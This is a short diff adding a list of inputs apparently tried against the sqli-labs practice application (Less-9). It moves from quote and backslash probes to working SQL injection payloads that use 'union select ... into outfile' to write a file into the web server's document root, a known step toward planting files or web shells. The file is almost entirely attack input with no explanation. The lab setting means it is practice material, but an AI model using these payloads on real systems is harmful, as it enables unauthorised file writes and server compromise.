@@ -1,0 +1,11 @@
+ID:1
+ID:1\
+ID:1\\\
+ID:1'
+ID:1'
+ID:1
+ID:1'
+ID:1' union select 1,2,4 into outfile '/var/www/html/sqli-labs/Less-9/u.txt'
+ID:1' union select 1,2,4 into outfile '/var/www/html/sqli-labs/Less-9/u.txt' -- 
+ID:1' union select 1,2,4 into outfile '/var/www/html/sqli-labs/Less-9/u.txt' -- 
+ID:1' union select 1,2,5 into outfile '/var/www/html/sqli-labs/Less-9/u.txt' -- 
